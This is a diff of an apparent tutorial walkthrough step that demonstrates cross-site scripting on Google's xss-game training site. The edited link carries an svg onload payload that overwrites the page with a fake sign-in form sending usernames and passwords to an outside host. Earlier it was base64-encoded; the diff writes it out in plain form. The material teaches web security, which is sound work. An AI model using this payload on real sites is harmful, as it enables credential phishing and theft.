@@ -34,7 +34,7 @@ https://970-cs-202608506355-default.cs-asia-southeast1-ajrg.cloudshell.dev/mini-
 =============
 
 > hello <a name='n'
-> href='https://xss-game.appspot.com/level1/frame?query=<svg/onload=window.location="data:text/html;base64,PC9hPjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2Pjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxkaXYgc3R5bGU9J2JhY2tncm91bmQ6ICM5N2UzZmY7IHBvc2l0aW9uOiBmaXhlZDsgdG9wOiA4MCU7IGxlZnQ6IDUwJTsgbWFyZ2luLXRvcDogLTUwcHg7ICBtYXJnaW4tbGVmdDogLTE1MHB4OyBib3JkZXItc3R5bGU6IGRvdWJsZTsnPlBsZWFzZSBzaWduIGluIGJlbG93Ojxicj48Zm9ybSBhY3Rpb249aHR0cHM6Ly9iaW5nLmNvbS9qdXN0PnVzZXJuYW1lOjxpbnB1dCB0eXBlPXRleHQgbmFtZT11Pjxicj5wYXNzd29yZDo8aW5wdXQgdHlwZT1wYXNzd29yZCBuYW1lPXA+PGJyPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nU2lnbiBpbic+PC9mb3JtPjxicj48L2Rpdj4=">'>*appspot*</a>\
+> href='https://xss-game.appspot.com/level1/frame?query=<svg/onload=document.body.innerHTML="</a></div></div></div></div></div></div></div></div></div></div></div></div><br><br><br><br><br><br><br><br><br><br><br><br><div style='background: #97e3ff; position: fixed; top: 80%; left: 50%; margin-top: -50px;  margin-left: -150px; border-style: double;'>Please sign in below:<br><form action=https://bing.com/just>username:<input type=text name=u><br>password:<input type=password name=p><br><input type=submit value='Sign in'></form><br></div>">'>*appspot*</a>\
 
 </walkthrough-html-step>
 
